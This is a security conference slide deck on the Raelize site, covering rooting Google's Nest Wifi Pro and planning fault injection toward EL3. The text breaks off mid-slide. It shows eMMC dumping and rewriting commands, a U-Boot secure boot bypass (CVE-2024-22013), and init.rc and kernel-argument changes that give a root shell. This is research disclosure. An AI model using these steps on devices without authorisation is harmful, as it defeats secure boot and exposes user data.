@@ -1,0 +1,1711 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="utf-8">
+	<title></title>
+
+	<!-- mobile responsive meta -->
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta name="description" content="Raelize provides top-notch embedded device security serrvices like consultancy, testing, research and training.">
+	
+	<meta name="author" content="Raelize B.V.">
+	<meta name="generator" content="Hugo 0.147.9">
+
+	<!-- plugins -->
+	
+	<link rel="stylesheet" href="https://raelize.com/plugins/bootstrap/bootstrap.min.css">
+	
+	<link rel="stylesheet" href="https://raelize.com/plugins/themify-icons/themify-icons.css">
+	
+	<link rel="stylesheet" href="https://raelize.com/plugins/magnific-popup/magnific-popup.css">
+	
+	<link rel="stylesheet" href="https://raelize.com/plugins/slick/slick.css">
+	
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Anaheim%7cQuattrocento&#43;Sans:400,700&amp;display=swap">
+	
+
+	<!-- Main Stylesheet -->
+	
+	<link rel="stylesheet" href="https://raelize.com/css/style.min.css" media="screen">
+
+	<!-- Custom stylesheet - for your changes -->
+	
+  <link rel="stylesheet" href="https://raelize.com/css/custom.min.css" media="screen">
+
+	<!--Favicon-->
+	<link rel="shortcut icon" href="https://raelize.com/images/Uk3Fdpje_400x400.jpg" type="image/x-icon">
+	<link rel="icon" href="https://raelize.com/images/Uk3Fdpje_400x400.jpg" type="image/x-icon">
+
+	
+	<!-- Global Site Tag (gtag.js) - Google Analytics -->
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-135892271-3"></script>
+	<script>
+	  window.dataLayer = window.dataLayer || [];
+	  function gtag(){dataLayer.push(arguments);}
+	  gtag('js', new Date());
+
+	  gtag('config', 'UA-135892271-3');
+	</script>
+	
+
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+
+<body id="body" data-spy="scroll" data-target=".navbar" data-offset="55">
+  <div id="content">
+    
+ <section class="sticky-top navigation">
+	<div class="container">
+		<nav class="navbar navbar-expand-lg navbar-dark">
+			<a class="navbar-brand p-0" href="/">
+				
+				<img class="lozad" data-src="https://raelize.com/images/logo.png" alt="Raelize - Embedded Device Security Services Consultancy Testing Research Training" height="42">
+				
+			</a>
+
+			<button class="navbar-toggler rounded-0" type="button" data-toggle="collapse" data-target="#navigation">
+				<span class="navbar-toggler-icon"></span>
+			</button>
+
+			<div class="collapse navbar-collapse" id="navigation">
+				<ul class="navbar-nav ml-auto">
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/about">about</a>
+					</li>
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/#services">overview</a>
+					</li>
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/training">training</a>
+					</li>
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/consultancy">consultancy</a>
+					</li>
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/testing">testing</a>
+					</li>
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/publications">publications</a>
+					</li>
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/blog">blog</a>
+					</li>
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/resources">resources</a>
+					</li>
+					
+					<li class="nav-item">
+            <a class="nav-link" href="https://raelize.com/#contact">contact</a>
+					</li>
+					
+				</ul>
+				
+			</div>
+		</nav>
+	</div>
+</section>
+
+
+<section class="section">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 text-center">
+                <hr />
+                <h2></h2>
+                
+                <p>Monday, Jan 1, 0001</p>
+                <hr />
+                
+            </div>
+            <div class="col-lg-8 offset-lg-2">
+                <div class="post-single-content" background-color="0xff"><!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <title>EL3vated Privileges</title>
+
+    <link rel="stylesheet" href="dist/reset.css">
+    <link rel="stylesheet" href="dist/reveal.css">
+    <link rel="stylesheet" href="dist/theme/black.css">
+
+    <!-- Theme used for syntax highlighted code -->
+    <link rel="stylesheet" href="plugin/highlight/zenburn.css">
+    <link rel="stylesheet" href="plugin/highlight/monokai.css">
+
+    <!-- custom css -->
+    <style>
+        .reveal #grading {
+            width: 45vw !important;
+            max-width: 45vw !important;
+            margin-left: -5vw !important;
+        }
+        .fragment.blur {
+            filter: blur(5px);
+        }
+        .fragment.blur.visible {
+            filter: none;
+        }
+        .container{
+          display: flex;
+        }
+        .col {
+          flex: 1;
+        }
+        /* coder {
+            text-decoration: underline;
+            text-decoration-color: yellow;
+            text-decoration-thickness: 2px;
+            text-underline-offset: 5px;
+        } */
+        coder {
+            /* background-color: #f4f4f4;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            padding: 1px 1px;
+            font-family: 'Courier New', monospace; */
+            color: #c7254e;
+        }
+    </style>
+</head>
+>
+<div class="reveal">
+<div class="slides">
+
+<!-- -------------->
+<!-- Title       -->
+<!-- -------------->
+<section>
+    <img src="images/logo.png" width="200"></img>
+    <hr>
+    <h3>EL3vated Privileges</h3>
+    <p>Glitching Google's Wifi Pro from Root to EL3<span style="color: yellow;">.</span></p>
+    <hr>
+    <p>
+        <small>
+            Niek Timmers
+            <br>
+            ( <a href="mailto:niek@raelize.com">niek@raelize.com</a> )
+        </small>
+    </p>
+</section>
+
+<!-- -------------->
+<!-- Overview    -->
+<!-- -------------->
+<section data-markdown>
+    <script type="text/template">
+        #### Overview<span style="color: yellow;">.</span>
+        <hr>
+
+        * Introduction <!-- .element: class="fragment custom blur" data-fragment-index="1" -->
+        * Getting root on Google's Nest Wifi Pro <!-- .element: class="fragment custom blur" data-fragment-index="2" -->
+        * Glitching Google's Nest Wifi Pro <!-- .element: class="fragment custom blur" data-fragment-index="3" -->
+        * Journey from root to EL3 <!-- .element: class="fragment custom blur" data-fragment-index="4" -->
+        * Conclusion <!-- .element: class="fragment custom blur" data-fragment-index="5" -->
+
+    </script>
+</section>
+
+<!-- --------------->
+<!-- Introduction -->
+<!-- --------------->
+<section>
+    <p>Introduction<span style="color: yellow">.</span></p>
+</section>
+
+<!-- --------------->
+<!-- Realize      -->
+<!-- --------------->
+<section data-markdown>
+    <script type="text/template">
+        <img src="images/logo.png" width="200"></img>
+        <hr>
+
+        * Founded in 2020  in The Netherlands <!-- .element: class="fragment custom blur" data-fragment-index="1" -->
+            * By Cristofaro Mune & Niek Timmers
+            * We used to work for Riscure (2010-2019)
+        * Services: Consultancy, Research and Training <!-- .element: class="fragment custom blur" data-fragment-index="2" -->
+        * (Device) Security Expertise: <!-- .element: class="fragment custom blur" data-fragment-index="3" -->
+            * Secure Boot
+            * Trusted Execution Environment (TEE)
+            * Fault Injection ( &#128165; )
+    </script>
+</section>
+
+<!-- ---------------------------->
+<!-- Yesterday's research      -->
+<!-- ---------------------------->
+<section data-markdown>
+    <script type="text/template">
+        #### Yesterday's research<span style="color: yellow;">.</span>
+
+        <hr>
+
+        * Analysis of Qualcomm IPQ401x-based devices  <!-- .element: class="fragment custom blur" data-fragment-index="1" -->
+            * E.g., Netgear Orbi RB20, Linksys EA8300, ...
+        * Several critical software vulnerabilities in Qualcomm's TEE (QSEE)  <!-- .element: class="fragment custom blur" data-fragment-index="2" -->
+            * E.g., [CVE-2020-11256](https://www.qualcomm.com/company/product-security/bulletins/january-2021-bulletin#_cve-2020-11256)
+        * Also, we compromised QSEE using EM glitches ( &#128165; ) <!-- .element: class="fragment custom blur" data-fragment-index="3" -->
+    </script>
+</section>
+
+<!-- ---------------------------->
+<!-- Today's research          -->
+<!-- ---------------------------->
+<section data-markdown>
+    <script type="text/template">
+        ##### Today's research<span style="color: yellow;">.</span>
+        <hr>
+        <div style="display: flex; align-items: center; gap: 2rem;">
+        <div style="flex: 6; font-size: 0.7em;">
+
+        * Analysis of Google's Nest Wifi Pro <!-- .element: class="fragment custom blur" data-fragment-index="1" -->
+            * Wi-Fi 6E Router
+            * Available globally
+        * Based on Qualcomm's IPQ5018 SoC <!-- .element: class="fragment custom blur" data-fragment-index="2" -->
+            * Dual-core 64-bit ARM CPU
+            * Secure Boot
+            * Trusted Execution Environment (QSEE)
+        * Modern software stack <!-- .element: class="fragment custom blur" data-fragment-index="3" -->
+            * Android (but no support for apps)
+            * Linux 5.4.89
+            * ...
+
+        </div>
+        <div style="flex: 4;">
+
+        ![](images/wifipro.png)
+
+        </div>
+        </div>
+    </script>
+</section>
+
+<!-- ------------------------------>
+<!-- Lets open the device -->
+<!-- ------------------------------>
+<section>
+    <p>Lets open the device<span style="color: yellow;">.</span></p>
+</section>
+
+<!-- ------------------------------>
+<!-- Serial interfacee -->
+<!-- ------------------------------>
+<section data-markdown>
+    <script type="text/template">
+    ##### Serial interface<span style="color: yellow;">.</span>
+    <hr>
+    <div style="flex: 1; max-height: 500px; overflow: hidden; display: flex; align-items: center; justify-content: center;">
+    <div style="flex: 4;"> <!-- .element: class="fragment custom blur" data-fragment-index="1" -->
+        <img src="images/uart1.png">
+    </div>
+    <div style="flex: 4;"> <!-- .element: class="fragment custom blur" data-fragment-index="2" -->
+        <img src="images/uart2.png">
+    </div>
+    <div style="flex: 2; text-align: left; font-size: 0.4em;">  <!-- .element: class="fragment custom blur" data-fragment-index="3" -->
+        <pre>
+            <code data-trim data-noescape class="bash">
+                Format: Log Type - Time(microsec) - Message - Optional Info
+                Log Type: B - Since Boot(Power On Reset),  D - Delta,  S – Statistic
+                S – QC_IMAGE_VERSION_STRING=BOOT.BF.3.3.1.1.C4-00012
+                S – IMAGE_VARIANT_STRING=MAASANAZA
+                S – OEM_IMAGE_VERSION_STRING=CRM
+                S - Mar  8 2022 01:13:12
+                S - Boot Config, 0x000002c3
+                B -       127 - PBL, Start
+                ...
+                B -    112636 - SBL1, Start
+                ...
+                U-Boot 2016.01-gc3449fb (Jan 24 2024 - 00:34:19 +0000)
+                DRAM:  smem ram ptable found: ver: 1 len: 4
+                1 GiB
+                NAND:  QPIC: disabled, skipping initialization
+                SF: Unsupported flash IDs: manuf 00, jedec c03f, ext_jedec 7fff
+                ipq_spi: SPI Flash not found (bus/cs/speed/mode) = (0/0/48000000/0)
+                MMC:   <NULL>: 0 (eMMC)
+                *** Warning - bad CRC, using default environment
+                PCI Link Intialized
+                PCI Link Intialized
+                In:    serial@78AF000
+                Out:   serial@78AF000
+                Err:   serial@78AF000
+                ART partition read failed..
+                Hit any key to stop autoboot:  0
+                do_bootipq: boot signed image
+                ...
+                Starting kernel...
+            </code>
+        </pre>
+    </div>
+    </div>
+    <p>No printing after U-Boot has finished! &#128542; </p> <!-- .element: class="fragment custom blur" data-fragment-index="4" -->
+    </script>
+</section>
+
+<!-- ------------------------------>
+<!-- Dumping the eMMC flash (1) -->
+<!-- ------------------------------>
+<section>
+    <h4>Dumping the eMMC flash<span style="color: yellow;">.</span></h4>
+    <hr>
+    <div style="display: flex; align-items: top; justify-content: center;">
+        <div style="flex: 3;" class="fragment custom blur" data-fragment-index="1">
+            <img src="images/flash1.png">
+            <p style="font-size: 0.8em">Locate the flash</p>
+        </div>
+        <div style="flex: 3;" class="fragment custom blur" data-fragment-index="2">
+            <img src="images/flash2.png">
+            <p style="font-size: 0.8em">Locate the signals</p>
+        </div>
+        <div style="flex: 3;" class="fragment custom blur" data-fragment-index="3">
+            <img src="images/flash3.png">
+            <p style="font-size: 0.8em">Connect to SD card</p>
+        </div>
+    </div>
+    <br>
+    <p class="fragment custom blur" data-fragment-index="4">Unfortunately, this did not work<span style="color: yellow;">.</span> &#128542;</p>
+    
+</section>
+
+<!-- ------------------------------>
+<!-- Fixing the issue -->
+<!-- ------------------------------>
+<section data-markdown>
+    <script type="text/template">
+    ##### Fixing the issue<span style="color: yellow;">.</span>
+
+    <hr>
+    <img src="images/flash4.png" width="500px">
+    <p style="font-size: 0.8em">Disconnect CLK from SoC while interfacing with flash</p>
+    </script>
+</section>
+
+<!-- ------------------------------>
+<!-- Fixing the issue -->
+<!-- ------------------------------>
+<section>
+    <h4>Accessing the flash contents<span style="color: yellow;">.</span></h4>
+    <hr>
+    <div style="display: flex; align-items: flex-start; gap: 1rem; max-width: 100%; width: 100%; box-sizing: border-box;">
+        <div style="flex: 1; min-width: 0; font-size: 0.5em" class="fragment custom blur" data-fragment-index="1">
+            <p>Flash detected by Linux driver</p>
+            <pre>
+                <code data-trim data-noescape class="bash">
+                    $ sudo dmesg
+                    usb-storage 1-2:1.0: USB Mass Storage device detected
+                    scsi 0:0:0:0: Direct-Access Generic- SD/MMC
+                    Attached scsi generic sg0 type 0
+                    Attached scsi generic sg1 type 0
+                    [sda] 7634944 512-byte logical blocks: (3.91 GB/3.64 GiB)
+                    [sda] Attached SCSI removable disk
+                    sda: sda1 sda2 sda3 sda4 sda5 sda6 sda7 sda8 sda9 sda10
+                         sda11 sda12 sda13 sda14 sda15 sda16 sda17 sda18 sda19
+                </code>
+            </pre>
+            <div class="fragment custom blur" data-fragment-index="2">
+            <p>Dumping the entire flash</p>
+            <pre>
+                <code data-trim data-noescape class="bash">
+                    $ sudo dd if=/dev/sda of=flash.bin bs=512
+                </code>
+            </pre>
+        </div>
+        <div class="fragment custom blur" data-fragment-index="3">
+            <p>Writing a particular partition</p>
+            <pre>
+                <code data-trim data-noescape class="bash">
+                    $ sudo dd if=qsee_b of=/dev/sda6 bs=512
+                </code>
+            </pre>
+        </div>
+        </div>
+        <div style="flex: 1; min-width: 0; font-size: 0.5em" class="fragment custom blur" data-fragment-index="4">
+            <p>Printing the GPT header</p>
+            <pre>
+                <code data-trim data-noescape class="bash">
+                    $ parted flash.bin
+                    (parted) p
+                    Partition Table: gpt
+                    Number  Start   End     Size    File system  Name
+                    1      17,4kB  280kB   262kB                sbl
+                    2      280kB   4474kB  4194kB               fts
+                    3      4474kB  38,0MB  33,6MB  ext4         factory
+                    4      38,0MB  39,1MB  1049kB               misc
+                    5      39,1MB  39,7MB  655kB                qsee_a
+                    6      39,7MB  40,4MB  655kB                qsee_b
+                    7      40,4MB  40,5MB  131kB                devcfg_a
+                    8      40,5MB  40,6MB  131kB                devcfg_b
+                    9      40,6MB  40,8MB  131kB                cdt_a
+                    10      40,8MB  40,9MB  131kB                cdt_b
+                    11      40,9MB  43,0MB  2097kB               uboot_a
+                    12      43,0MB  45,1MB  2097kB               uboot_b
+                    13      45,1MB  112MB   67,1MB               boot_a
+                    14      112MB   179MB   67,1MB               boot_b
+                    15      179MB   767MB   587MB   ext4         system_a
+                    16      767MB   1354MB  587MB   ext4         system_b
+                    17      1354MB  1773MB  419MB   ext4         cache
+                    18      1773MB  2835MB  1062MB               data
+                    19      2835MB  3909MB  1074MB  ext4         crash
+                </code>
+            </pre>
+        </div>
+    </div>
+</section>
+
+<!-- ------------------------------>
+<!-- What we achieved so far -->
+<!-- ------------------------------>
+<section>
+    <h4>What we achieved so far</h4>
+    <hr />
+    <div style="font-size: 1.0em">
+        <pre>
+            <code data-trim data-noescape class="language-C" data-line-numbers="1,2">
+                We can communicate via the serial interface
+                We can re-program the eMMC flash in place
+            </code>
+        </pre>
+    </div>
+</section>
+
+
+
+<!-- ------------------------------>
+<!-- Let's get root -->
+<!-- ------------------------------>
+<section>
+    <p>Let's get root<span style="color: yellow;">.</span></p>
+</section>
+
+<!-- ------------------------------>
+<!-- Secure Boot -->
+<!-- ------------------------------>
+<section data-markdown>
+    <script type="text/template">
+    ##### Secure Boot<span style="color: yellow;">.</span>
+
+    <hr>
+
+    <div style="display: flex; align-items: center; gap: 2rem;">
+
+    <div style="flex: 5; font-size: 0.6em;">
+
+
+    * Secure Boot is (likely) enabled by eFuse <!-- .element: class="fragment custom blur" data-fragment-index="1" -->
+        * So we cannot simply modify the flash
+    * Boot stages verify each other <!-- .element: class="fragment custom blur" data-fragment-index="2" -->
+        * ROM verifies SBL
+        * SBL verifies U-Boot
+        * U-Boot verifies Linux Kernel
+    * Confirmed by programming a modified Linux Kernel image <!-- .element: class="fragment custom blur" data-fragment-index="3" -->
+
+    </div>
+
+    <div style="flex: 4; width:50%"><!-- .element: class="fragment custom blur" data-fragment-index="3" -->
+
+    <pre style="font-size: 0.3em"><code data-trim data-noescape class="bash" data-line-numbers="19-22">
+    U-Boot 2016.01-gc3449fb (Jan 24 2024 - 00:34:19 +0000)
+    DRAM:  smem ram ptable found: ver: 1 len: 4
+    1 GiB
+    NAND:  QPIC: disabled, skipping initialization
+    SF: Unsupported flash IDs: manuf 00, jedec c03f, ext_jedec 7fff
+    ipq_spi: SPI Flash not found (bus/cs/speed/mode) = (0/0/48000000/0)
+    0 MiB
+    MMC:   <NULL>: 0 (eMMC)
+    *** Warning - bad CRC, using default environment
+
+    PCI Link Intialized
+    PCI Link Intialized
+    In:    serial@78AF000
+    Out:   serial@78AF000
+    Err:   serial@78AF000
+    ART partition read failed..
+    Hit any key to stop autoboot:  0
+    do_bootipq: boot signed image
+    Kernel image authentication failed
+    BUG: failure at board/qca/arm/common/cmd_bootqca.c:847/do_boot_signedimg()!
+    BUG!
+    resetting ...
+    </code></pre>
+
+    </div>
+
+    </div>
+
+    <p>We need to bypass Secure Boot to get a root shell! &#128542;</p><!-- .element: class="fragment custom blur" data-fragment-index="4" -->
+
+    </script>
+</section>
+
+<!-- ------------------------------>
+<!-- U-Boot Environment -->
+<!-- ------------------------------>
+
+<section>
+        <h4>U-Boot Environment<span style="color: yellow;">.</span></h4>
+        <hr>
+        <div style="font-size: 0.6em; align-items: left; justify-content: left; margin-bottom: 10px" class="fragment custom blur" data-fragment-index="1">
+            <ul>
+                <li>U-Boot uses an environment for various configuration options</li>
+                <ul>
+                    <li>Usually stored somewhere in (external) flash</li>
+                    <li>In this case, in a partition that does not exist &#129327;</li>
+                </ul>
+                <li class="fragment custom blur" data-fragment-index="2">Note, U-Boot source code is available in GPL sources provided by Google</li>
+            </ul>
+        </div>
+        <div style="max-height: 200px; display: flex; align-items: bottom; justify-content: center; margin-bottom: 50px">
+            <!-- <div style="flex: 5;  font-size: 0.8em;"> -->
+
+            <!-- </div> -->
+            <div style="flex: 4; font-size: 0.4em; align-items: center;" class="fragment custom blur" data-fragment-index="3">
+                <p>U-Boot searches for specific partitions</p>
+                <pre>
+                    <code data-trim data-noescape class="language-C" data-line-numbers="2,5">
+                        ...
+                        ret = get_partition_info_by_name(blk_dev, "0:APPSBLENV", &disk_info);
+
+                        if (ret)
+                            ret = get_partition_info_by_name(blk_dev,"ubootenv",&disk_info);
+
+                        if (ret == 0) {
+                            board_env_offset = disk_info.start * disk_info.blksz;
+                            board_env_size = disk_info.size * disk_info.blksz;
+                            board_env_range = board_env_size;
+                            BUG_ON(board_env_size > CONFIG_ENV_SIZE_MAX);
+                        }
+                        ...
+                    </code>
+                </pre>
+            </div>
+            <div style="flex: 4; font-size: 0.4em; align-items: center; margin-bottom: 10px" class="fragment custom blur" data-fragment-index="4">
+                <p>Failed search is reflected on serial interface</p>
+                <pre>
+                    <code data-trim data-noescape class="bash" data-line-numbers="7">
+                        U-Boot 2016.01-gc3449fb (Jan 24 2024 - 00:34:19 +0000)
+                        ...
+                        SF: Unsupported flash IDs: manuf 00, jedec c03f, ext_jedec 7fff
+                        ipq_spi: SPI Flash not found (bus/cs/speed/mode) = (0/0/48000000/0)
+                        0 MiB
+                        MMC:   <NULL>: 0 (eMMC)
+                        *** Warning - bad CRC, using default environment
+
+                        ...
+                        Hit any key to stop autoboot:  0
+                        do_bootipq: boot signed image
+                        ...
+                        Starting kernel ...
+                    </code>
+                </pre>
+            </div>
+        </div>
+        <p class="fragment custom blur" data-fragment-index="5">What if we add the missing partition? &#129300;</p>
+</section>
+
+<!-- ------------------------------>
+<!-- Secure Boot Bypass -->
+<!-- ------------------------------>
+
+<section>
+    <h4>Secure Boot Bypass<span style="color: yellow;">.</span></h4>
+    <hr>
+    <p class="fragment custom blur" data-fragment-index="1">Long story short: U-Boot will use our (malicious) env.</p>
+    <div style="max-height: 200px; display: flex; align-items: bottom; justify-content: center; margin-bottom: 50px">
+        <div style="flex: 4; font-size: 0.4em; align-items: center;" class="fragment custom blur" data-fragment-index="2">
+            <p>No verification when atf variable is set</p>
+            <pre>
+                <code data-trim data-noescape  data-line-numbers="6-10">
+                    ...
+                    if (ret == 0 && buf == 1 && !getenv(&quot;atf&quot;)) {
+                        printf("%s: boot signed image\n", __func__);
+                        ret = do_boot_signedimg(cmdtp, flag, argc, argv);
+                    }
+                    else if (ret == 0 || ret == -EOPNOTSUPP)
+                    {
+                        printf(&quot;%s: boot unsigned image\n&quot;, __func__);
+                       	ret = do_boot_unsignedimg(cmdtp, flag, argc, argv);
+                    }
+                    ...
+                </code>
+            </pre>
+        </div>
+        <div style="flex: 4; font-size: 0.4em; align-items: center;" class="fragment custom blur" data-fragment-index="3">
+        <p>Confirmed on the serial interface</p>
+        <pre>
+            <code data-trim data-noescape class="bash" data-line-numbers="11">
+                U-Boot 2016.01-gc3449fb (Jan 24 2024 - 00:34:19 +0000)
+                ...
+                SF: Unsupported flash IDs: manuf 00, jedec 7fff, ext_jedec ff3f
+                ipq_spi: SPI Flash not found (bus/cs/speed/mode) = (0/0/48000000/0)
+                MMC:   <NULL>: 0 (eMMC)
+                In:    serial@78AF000
+                Out:   serial@78AF000
+                Err:   serial@78AF000
+                ...
+                Hit any key to stop autoboot:  0
+                do_bootipq: boot unsigned image
+                ...
+                </code>
+            </pre>
+        </div>
+    </div>
+    <p class="fragment custom blur" data-fragment-index="4">We can now load an unsigned Linux kernel image! &#129395;</p>
+</section>
+
+<!-- ------------------------------>
+<!-- Bug also found by Sergei -->
+<!-- ------------------------------>
+
+<section>
+    <h4>Bug also found by <a href="">Sergei</a> (<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-22013">CVE-2024-22013</a>)</h4>
+    <hr />
+    <img src="images/hwio.png" width="60%">
+    <p style="font-size: 0.6m"> See his <a href="https://hardwear.io/netherlands-2024/presentation/google_wifi_secure_boot_bypass.pdf">talk</a> at <a href="https://hardwear.io/archives/netherlands-2024/">Hardwear.io Netherlands 2024</a></p>
+</section>
+
+<!-- ------------------------------>
+<!-- Root shel -->
+<!-- ------------------------------>
+
+<section>
+    <h4>Root shell</h4>
+    <hr>
+    <div style="display: flex; align-items: center; gap: 2rem;">
+        <div style="flex: 5; font-size: 0.6em;" class="fragment custom blur" data-fragment-index="1">
+        <ul>
+            <li>U-Boot verifies the kernel as part of an Android boot image containing the following:</li>
+            <ul>
+                <li>Kernel arguments</li>
+                <li>ramdisk</li>
+                <li>Linux Kernel</li>
+            </ul>
+            <li>As we can bypass Secure Boot, we can modify its contents</li>
+            <ul>
+                <li>Modify kernel arguments to enable printing</li>
+                <li>Modify init.rc in ramdisk to get root shell</li>
+            </ul>
+        </ul>
+        </div>
+        <div style="flex: 5; font-size: 0.4em; align-items: center;" class="fragment custom blur" data-fragment-index="2">
+            <div><p>Enable printing (modify <coder>'console='</coder> to <coder>'raelize='</coder>)</p></div>
+            <pre>
+                <code data-trim data-noescape  data-line-numbers="7">
+                    $ hexdump -C boot_b
+                    ...
+                    0060:  00 00 00 00 00 00 00 00 69 6e 69 74 3d 2f 69 6e |........init=/in|
+                    0070:  69 74 20 63 6c 6b 5f 69 67 6e 6f 72 65 5f 75 6e |it clk_ignore_un|
+                    0080:  75 73 65 64 20 72 6e 67 5f 63 6f 72 65 2e 64 65 |used rng_core.de|
+                    0090:  66 61 75 6c 74 5f 71 75 61 6c 69 74 79 3d 31 30 |fault_quality=10|
+                    00a0:  30 20 67 70 74 20 72 61 65 6c 69 7a 65 3d 20 20 |0 gpt raelize=  |
+                    00b0:  72 6f 20 6d 6f 64 75 6c 65 5f 62 6c 61 63 6b 6c |ro module_blackl|
+                    00c0:  69 73 74 3d 6f 76 65 72 6c 61 79 20 6c 6f 67 63 |ist=overlay logc|
+                    00d0:  61 74 5f 62 75 66 66 65 72 5f 73 69 7a 65 73 3d |at_buffer_sizes=|
+                    00e0:  31 30 32 34 2c 32 2c 32 2c 33 32 00 00 00 00 00 |1024,2,2,32.....|
+                    ...
+                </code>
+            </pre>
+            <div><p>Start root shell at the end of <coder>'on boot'</coder> (init.rc)</p></div>
+            <pre>
+                <code data-trim data-noescape  data-line-numbers="7">
+                    on init
+                        ...
+                    on boot
+                        ...
+                        exec /system/bin/ash
+                </code>
+            </pre>
+            <div><p>Root shell on the serial interface after we boot</p></div>
+            <pre>
+                <code data-trim data-noescape  data-line-numbers="7">
+                    # whoami
+                    root
+                    # getprop ro.build.description
+                    sirocco-user 3.73 OPENMASTER 406133 release-keys
+                </code>
+            </pre>
+        </div>
+    </div>
+</section>
+
+<!-- ------------------------------>
+<!-- What we achieved so far  -->
+<!-- ------------------------------>
+<section>
+    <h4>What we achieved so far</h4>
+    <hr />
+
+    <div style="font-size: 1.0em">
+        <pre>
+            <code data-trim data-noescape class="language-C" data-line-numbers="3-5">
+                We can communicate via the serial interface
+                We can re-program the eMMC flash in place
+                We bypassed Secure Boot with a bug in U-Boot
+                - We enabled printing on the serial interface
+                - We start a root shell on the serial interface
+            </code>
+        </pre>
+    </div>
+</section>
+
+<section>
+    <p>Let's go deeper! &#128527; </p>
+</section>
+
+<!-- ------------------------------>
+<!-- Trusted Execution Enviornment (TEE) -->
+<!-- ------------------------------>
+
+<section>
+    <h4>Trusted Execution Enviornment (TEE)</h4>
+    <hr>
+    <div style="display: flex; align-items: center; gap: 2rem;">
+        <div style="flex: 6; font-size: 0.7em;" class="fragment custom blur" data-fragment-index="1">
+            <ul>
+                <li>Google's Wifi Pro uses Qualcomm's TEE (i.e., QSEE) to protect user data</li>
+                <ul>
+                    <li>Implemeted using ARM TrustZone</li>
+                    <li>Separate subsystem separated from Linux</li>
+                </ul>
+                <li>As any ARM64-based TEE, it's composed of:</li>
+                <ul>
+                    <li>Secure Monitor (EL3)</li>
+                    <li>Secure OS (S-EL1)</li>
+                    <li>Trusted Applications (S-EL0)</li>
+                </ul>
+                <li>When Linux is compromised, it should not affect the secrets protected by QSEE</li>
+            </ul>
+        </div>
+        <div style="flex: 4; font-size: 0.6em;" class="fragment custom blur" data-fragment-index="2">
+            <img src="images/drawio_escalate.png" width="60%">
+        </div>
+    </div>
+
+    <p class="fragment custom blur" data-fragment-index="3">Our goal is to escalate privileges from root to EL3! &#128526;</p>
+</section>
+
+<!-- ------------------------------>
+<!-- Typical approach -->
+<!-- ------------------------------>
+
+<section>
+    <h4>Typical approach: SW vulnerabilities</h4>
+    <hr>
+    <div style="display: flex; align-items: center; gap: 2rem;">
+        <div style="flex: 6; font-size: 0.7em;" class="fragment custom blur" data-fragment-index="1">
+            <ul>
+                <li>Find and exploit software vulnerabilities in:</li>
+                <ul>
+                    <li>Secure Monitor to get EL3</li>
+                    <li>Secure OS to get S-EL1</li>
+                    <li>Trusted Application to get S-EL0</li>
+                </ul>
+                <li>We can interrace with them all from a modified Kernel (i.e., using smc instructions)</li>
+            </ul>
+        </div>
+        <div style="flex: 4; font-size: 0.6em;" class="fragment custom blur" data-fragment-index="1">
+            <img src="images/drawio_escalate2.png" width="60%">
+        </div>
+    </div>
+    <p class="fragment custom blur" data-fragment-index="2">We found bugs, but we cannot talk about it yet... &#128548;</p>
+</section>
+
+<!-- ------------------------------>
+<!-- Another idea -->
+<!-- ------------------------------>
+
+<section>
+    <h4>&#127775; Another idea &#127775;</h4>
+    <hr>
+    <ul>
+        <li class="fragment custom blur" data-fragment-index="1">Glitch (&#9889;) the Secure Monitor to get a R/W primitive</li>
+        <li class="fragment custom blur" data-fragment-index="2">Use R/W primitive to configure the secure memory</li>
+        <li class="fragment custom blur" data-fragment-index="3">Use root shell to rewrite Secure Monitor code</li>
+        <li class="fragment custom blur" data-fragment-index="4">Execute modified Secure Monitor code &#128184; &#128184; &#128184;</li>
+    </ul>
+    <p class="fragment custom blur" data-fragment-index="5">Will this work? Let's find out!</p>
+</section>
+
+<!-- ------------------------------>
+<!-- What do we need? -->
+<!-- ------------------------------>
+
+<section>
+    <h4>What do we need? &#128552; </h4>
+    <hr>
+    <ul>
+        <li class="fragment custom blur" data-fragment-index="1">Ability to glitch Qualcomm's IPQ5018 SoC</li>
+            <ul class="fragment custom blur" data-fragment-index="1"><li>Requires a fault injection setup</li></ul>
+        <li class="fragment custom blur" data-fragment-index="2">Ability to issue arbitrary smc instructions</li>
+            <ul class="fragment custom blur" data-fragment-index="2"><li>Requires kernel code execution</li></ul>
+        <li class="fragment custom blur" data-fragment-index="3">Ability to fault the right code construction</li>
+            <ul class="fragment custom blur" data-fragment-index="3"><li>Requires reversing and experimentation</li></ul>
+        <li class="fragment custom blur" data-fragment-index="4">Understanding of how secure memory is configured</li>
+            <ul class="fragment custom blur" data-fragment-index="4"><li>Requires reversing</li></ul>
+
+    </ul>
+</section>
+
+<!-- ------------------------------>
+<!-- Fault Injection Setup -->
+<!-- ------------------------------>
+
+<section>
+    <h4>Fault Injection Setup</h4>
+    <hr>
+    <div style="display: flex; align-items: center; gap: 0rem;">
+        <div style="flex: 3; font-size: 0.5em;">
+            <ul>
+                <li class="fragment custom blur" data-fragment-index="1">Communication</li>
+                    <ul class="fragment custom blur" data-fragment-index="1"><li>Serial interface</li></ul>
+                <li class="fragment custom blur" data-fragment-index="2">Trigger</li>
+                    <ul class="fragment custom blur" data-fragment-index="2"><li>Factory reset button (GPIO)</li></ul>
+                <li class="fragment custom blur" data-fragment-index="3">Reset</li>
+                    <ul class="fragment custom blur" data-fragment-index="3"><li>Relay to switch PSU</li></ul>
+                <li class="fragment custom blur" data-fragment-index="4">Tooling from Keysight</li>
+                    <ul >
+                        <li class="fragment custom blur" data-fragment-index="4">Spider</li>
